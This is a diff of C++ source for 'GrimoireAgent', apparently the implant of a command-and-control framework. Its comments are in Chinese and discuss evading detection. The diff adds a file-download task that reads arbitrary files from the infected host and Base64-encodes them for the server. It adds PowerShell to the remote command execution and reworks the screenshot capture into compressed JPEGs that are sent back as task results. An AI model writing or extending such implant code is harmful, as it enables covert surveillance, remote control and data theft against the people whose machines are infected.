@@ -2,13 +2,18 @@
 // Created by Nebu1ea on 2025/11/25.
 //
 
+
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+
+
+#include "stb_image_write.h"
 #include "GrimoireAgent.hpp"
 #include "GrimoireConfig.hpp"
 #include "Utils.hpp"
 #include <iostream>
 #include <random>
 #include <thread>
-
+#include <fstream>
 // 引入特定平台的头文件，用于命令执行和截屏（Windows API）
 #ifdef _WIN32
 #include <windows.h>
@@ -33,10 +38,35 @@ GrimoireAgent::GrimoireAgent() {
 }
 
 
+
+// 专门处理下载的逻辑
+std::string GrimoireAgent::HandleDownload(const std::string& filePath) {
+    // 以二进制模式打开文件
+
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file.is_open()) {
+        std::string errorMsg = "ERROR: Cannot open file " + filePath;
+
+        std::vector<unsigned char> failMessage(
+            errorMsg.begin(), errorMsg.end()
+        );
+        return Utils::Base64Encode(failMessage);
+    }
+
+    // 将整个文件读入 buffer
+    std::vector<unsigned char> buffer(
+        (std::istreambuf_iterator<char>(file)),
+        (std::istreambuf_iterator<char>())
+    );
+    file.close();
+
+    // 将二进制 buffer 转为 Base64 字符串
+    return Utils::Base64Encode(buffer);
+}
+
 // ----------------------------------------------------
 // 任务处理：命令执行 (Command Execution)这是最不隐蔽的方式，非常的西巴，掩蔽的方式以后实现
 // ----------------------------------------------------
-
 std::string GrimoireAgent::ExecuteCommand(const std::string& command, const std::string& shellType) {
     std::string finalCommand;
 
@@ -85,18 +115,17 @@ std::string GrimoireAgent::ExecuteCommand(const std::string& command, const std:
 // ----------------------------------------------------
 // 任务处理：截屏 (Screenshot) 及其不隐蔽，掩蔽的太难写了，要调用DXGI
 // ----------------------------------------------------
-std::vector<unsigned char> GrimoireAgent::TakeScreenshot() {
+std::string GrimoireAgent::TakeScreenshot() {
     #ifdef _WIN32
-        std::vector<unsigned char> result;
-
         // 获取屏幕设备上下文 (DC)
-        HDC hScreen = GetDC(nullptr); // NULL for the entire screen
+        SetProcessDPIAware();
+        HWND hDesktop = GetDesktopWindow();
+        HDC hScreen = GetDC(hDesktop);
         HDC hDC = CreateCompatibleDC(hScreen);
 
         if (!hScreen || !hDC) {
-            std::cerr << "ERROR: Failed to get screen DC or create compatible DC." << std::endl;
-            if (hScreen) ReleaseDC(nullptr, hScreen);
-            return {}; // 返回空向量
+            if (hScreen) ReleaseDC(hDesktop, hScreen);
+            return "";
         }
 
         // 获取屏幕尺寸
@@ -106,71 +135,52 @@ std::vector<unsigned char> GrimoireAgent::TakeScreenshot() {
         // 创建兼容位图
         HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
         if (!hBitmap) {
-            std::cerr << "ERROR: Failed to create compatible bitmap." << std::endl;
             DeleteDC(hDC);
-            ReleaseDC(nullptr, hScreen);
-            return {};
+            ReleaseDC(hDesktop, hScreen);
+            return "";
         }
 
         // 将位图选入设备上下文
         HGDIOBJ hOld = SelectObject(hDC, hBitmap);
+        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
 
-        // 将屏幕内容复制到位图 (核心API调用，也是最易被HOOK的地方)
-        if (!BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY)) {
-            std::cerr << "ERROR: BitBlt failed." << std::endl;
-            SelectObject(hDC, hOld);
-            DeleteObject(hBitmap);
-            DeleteDC(hDC);
-            ReleaseDC(nullptr, hScreen);
-            return {};
-        }
+        // 准备像素数据容器
+        BITMAPINFO bmi = { 0 };
+        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+        bmi.bmiHeader.biWidth = width;
+        bmi.bmiHeader.biHeight = -height; // Top-Down
+        bmi.bmiHeader.biPlanes = 1;
+        bmi.bmiHeader.biBitCount = 32;
+        bmi.bmiHeader.biCompression = BI_RGB;
 
-        // 将 HBITMAP 数据转换为 BMP 字节流
-        BITMAPFILEHEADER bmFH;
-        BITMAPINFOHEADER bmIH;
+        std::vector<unsigned char> buffer(width * height * 4);
+        GetDIBits(hDC, hBitmap, 0, height, buffer.data(), &bmi, DIB_RGB_COLORS);
 
-        // 获取位图信息
-        bmIH.biSize = sizeof(BITMAPINFOHEADER);
-        bmIH.biWidth = width;
-        bmIH.biHeight = height;
-        bmIH.biPlanes = 1;
-        bmIH.biBitCount = 32; // 32-bit color depth
-        bmIH.biCompression = BI_RGB;
-
-        DWORD dwSize = ((width * 32 + 31) / 32) * 4 * height;
-
-        // 分配内存
-        std::vector<char> buffer(dwSize);
-
-        // 获取位图数据
-        GetDIBits(hDC, hBitmap, 0, height, buffer.data(), reinterpret_cast<BITMAPINFO*>(&bmIH), DIB_RGB_COLORS);
-
-        // 填充文件头
-        bmFH.bfType = 0x4D42; // 'BM'
-        bmFH.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSize;
-        bmFH.bfReserved1 = 0;
-        bmFH.bfReserved2 = 0;
-        bmFH.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-
-        // 组合数据流 (BMP Header + BMP Info + Pixel Data)
-        result.insert(result.end(), reinterpret_cast<unsigned char*>(&bmFH), reinterpret_cast<unsigned char*>(&bmFH) + sizeof(BITMAPFILEHEADER));
-        result.insert(result.end(), reinterpret_cast<unsigned char*>(&bmIH), reinterpret_cast<unsigned char*>(&bmIH) + sizeof(BITMAPINFOHEADER));
-        result.insert(result.end(), buffer.begin(), buffer.end());
-
-        // 清理资源
+        // 清理 GDI 资源
         SelectObject(hDC, hOld);
         DeleteObject(hBitmap);
         DeleteDC(hDC);
-        ReleaseDC(nullptr, hScreen);
+        ReleaseDC(hDesktop, hScreen);
 
-        std::cout << "DEBUG: Screenshot taken, size: " << result.size() << " bytes." << std::endl;
-        return result;
-    #else
-        // 占位符 (Linux/macOS 通常需要 Xlib 或 Wayland/Pipewire 库，工程量较大)
-        std::cout << "DEBUG: Attempting to take screenshot (stub)..." << std::endl;
-        std::string placeholder_data = "Placeholder: Screenshot data is too complex to implement here for non-Windows.";
-        std::vector<unsigned char> result(placeholder_data.begin(), placeholder_data.end());
-        return result;
+        // 颜色转换 (BGRA -> RGBA)
+        for (size_t i = 0; i < buffer.size(); i += 4) {
+            std::swap(buffer[i], buffer[i + 2]);
+        }
+
+        std::vector<unsigned char> jpgData;
+        stbi_write_jpg_to_func(
+        [](void* context, void* data, int size) {
+            auto& vec = *static_cast<std::vector<unsigned char>*>(context);
+            vec.insert(vec.end(), (unsigned char*)data, (unsigned char*)data + size);
+            },
+            &jpgData,
+            width,       // 屏幕宽
+            height,      // 屏幕高
+            4,           // 像素通道数 (RGBA 选 4)
+            buffer.data(), // GetDIBits 拿到的原始数据
+            40
+        );
+        return Utils::Base64Encode(jpgData);
     #endif
 }
 
@@ -195,8 +205,8 @@ std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned
         std::string command_type = task_json["command"].get<std::string>();
 
         // 提取可选参数 argument，如果不存在则为空字符串
-        std::string argument = task_json.contains("argument")
-                               ? task_json["argument"].get<std::string>()
+        std::string argument = task_json.contains("arguments")
+                               ? task_json["arguments"].get<std::string>()
                                : "";
 
         std::string result_str;
@@ -205,7 +215,7 @@ std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned
         std::cout << "INFO: Executing task " << task_id << " (Type: " << command_type << ")..." << std::endl;
 
         // 2. 任务分发 (Dispatch based on command_type)
-        if (command_type == "shell" || command_type == "whoami") {
+        if (command_type == "shell" || command_type == "whoami" || command_type == "powershell") {
             // shell 任务的参数就是 argument
             std::string cmd_to_run =  argument;
 
@@ -218,9 +228,15 @@ std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned
 
         }else if (command_type == "screenshot") {
             // 截屏任务，可以忽略 argument 或用于指定格式/显示器
-            result_bytes = TakeScreenshot();
+            result_str = TakeScreenshot();
+            result_bytes.assign(result_str.begin(), result_str.end());
 
-        } else if (command_type == "sleep") {
+        }else if (command_type == "download") {
+            result_str = HandleDownload(argument);
+            result_bytes.assign(result_str.begin(), result_str.end());
+        }
+
+        else if (command_type == "sleep") {
             // 运行时修改休眠时间（后续我会补充）
             result_str = "INFO: Sleep time update task received.";
             result_bytes.assign(result_str.begin(), result_str.end());
@@ -295,12 +311,16 @@ void GrimoireAgent::Run() {
         std::vector<unsigned char> result_payload;
 
         if (!task_payload.empty()) {
+            std::cout << "<DEBUG> Task:      " << task_payload.data() << std::endl;
             // 处理任务
             result_payload = ProcessTask(task_payload);
+
         }
+
 
         // 发送结果 (如果 result_payload 非空，则发送任务结果；否则发送心跳)
         if (!result_payload.empty()) {
+            std::cout << "<DEBUG>  Result:     " << result_payload.data() << std::endl;
              comms_manager_->SendResult(result_payload);
         }
 
